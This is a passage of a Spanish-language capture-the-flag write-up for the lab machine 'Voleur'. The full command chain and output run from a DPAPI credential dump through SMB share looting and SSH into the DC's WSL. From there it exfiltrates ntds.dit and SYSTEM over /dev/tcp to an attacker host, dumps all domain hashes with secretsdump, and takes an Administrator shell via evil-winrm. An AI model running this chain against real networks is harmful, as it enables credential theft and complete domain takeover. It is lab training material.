Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

>Ahora podemos acceder al contenido del blob empleando la decrypted key: `jeremy.combs:qT3V9pLXyN7W4m`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

>Vemos que jeremy pertenece a otro grupo interesante que puede tener alguna share:

<img width="690" height="241" alt="image" src="https://github.com/user-attachments/assets/bed8c352-8347-4fbb-8077-830f62907c2a" />

>Pedimos su TGT y vemos sus shares:

```bash
┌──(kali㉿jbkira)-[~]
└─$ impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m'             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
                                                                                                                                                                                                       
┌──(kali㉿jbkira)-[~]
└─$ export KRB5CCNAME=jeremy.combs.ccache

┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ nxc smb dc.voleur.htb -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k --shares 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

>Accedemos de nuevo a la share IT y vemos una nota y una clave privada de SSH:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-smbclient -k dc.voleur.htb                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 11:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 11:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 11:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 11:07:35 2025 Note.txt.txt
# get id_rsa
# get Note.txt.txt
# exit
```

>La nota dice que emplea WSL por lo que podemos conectarnos por SSH al subsistema de Linux del DC empleando la clave privada:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ cat Note.txt.txt          
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin 

┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ ssh -i id_rsa svc_backup@10.10.11.76 -p 2222
<SNIP>
svc_backup@DC:~$
```

>Como se trata de un usuario que se va a emplear para backups del DC puede ser que tengamos en algún lugar el ntds.dit que nos permitiría comprometer por completo el dominio:

```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
```

>Nos lo traemos a nuestra máquina local junto a la hive SYSTEM:

```bash
# Máquina atacante
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ nc -nlvp 7777 > ntds.dit                                               
listening on [any] 7777 ...

┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ nc -nlvp 6666 > SYSTEM                                               
listening on [any] 6666 ...

# Máquina víctima
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cat ntds.dit > /dev/tcp/10.10.15.71/7777
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cd ../registry/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ cat SYSTEM > /dev/tcp/10.10.15.71/6666
```

>Ahora que tenemos el ntds.dit y la hive de SYSTEM podemos obtener todas las credenciales de los usuarios del dominio mediante secretsdump:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM local                                                                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```

>Obtenemos el TGT del usuario Administrador, nos conectamos por evil-winrm y leemos la root flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-getTGT voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ export KRB5CCNAME=Administrator.ccache                                                                                        
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
2c3c336247c0eb222bfb4ff3eea056f2
```
